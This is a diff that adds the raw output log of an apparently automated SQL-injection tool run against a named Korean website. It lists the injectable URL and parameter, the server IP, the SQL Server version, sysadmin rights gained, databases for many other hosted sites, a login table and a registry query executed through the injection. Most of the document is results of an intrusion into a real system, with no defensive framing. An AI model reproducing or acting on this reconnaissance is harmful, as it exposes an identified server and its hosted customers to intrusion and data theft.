@@ -1,0 +1,97 @@
+■漏洞信息:============================================================
+ ·URL:http://l-casino.com/zb/view.asp?uid=80&startPage=1&boardid=zb_afternote&category=%C0%FC%C3%BC
+ ·页面标题： 郡墨瘤畴 龋炮俊 坷脚巴阑 券康钦聪促. 
+ ·参数:uid=80&startPage=1&boardid=zb_afternote&category=%C0%FC%C3%BC
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.236.184.94
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 08:06:17 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 43557
+Content-Type: text/html
+Set-Cookie: zb%5Fafternote%5F80%5Fhit=1; path=/
+Set-Cookie: ASPSESSIONIDCQQSTADS=JABLKNJADPMBBMNKLLAFFLID; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：lcasino
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：Y2010M05WIN2003
+- 服务名：MSSQLSERVER
+- 系统用户名：lcasino
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+114open_new	D:\database\114open_new_Data.MDF	
+114open_old	D:\database\114open_old_Data.MDF	
+33tv	D:\database\33tv.mdf	
+aceviewtech	D:\database\aceviewtech_Data.MDF	
+ache	D:\database\ache_Data.MDF	
+airconnara	D:\database\airconnara_Data.MDF	
+aloe	D:\database\aloe_Data.MDF	
+alpecin	D:\database\alpecin_Data.MDF	
+anistand	D:\database\anistand_Data.MDF	
+appletree	D:\database\appletree_Data.MDF	
+artcage	D:\database\artcage_Data.MDF	
+artech	D:\database\artech_Data.MDF	
+askname	D:\database\askname_Data.MDF	
+aurumgolf	D:\database\aurumgolf_Data.MDF	
+bahnhof	D:\database\bahnhof_Data.MDF	
+bandosports	D:\database\bandosports_Data.MDF	
+batterthanbeer	D:\database\batterthanbeer_Data.MDF	
+bensonim	D:\database\bensonim_Data.MDF	
+bestplus	D:\database\bestplus_Data.MDF	
+bestshop	D:\database\bestshop_Data.MDF	
+biblexpo	D:\database\biblexpo_Data.MDF	
+bikespeed	D:\database\bikespeed_Data.MDF	
+bikespeed_eng	D:\database\bikespeed_eng_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+Y2010M05WIN2003	SQL Server	SQLOLEDB	Y2010M05WIN2003		Y2010M05WIN2003	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		05  5 2010  2:36AM	05  5 2010  2:36AM	
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+Dir of D:: 
+一次性获取失败，正在批次获取……
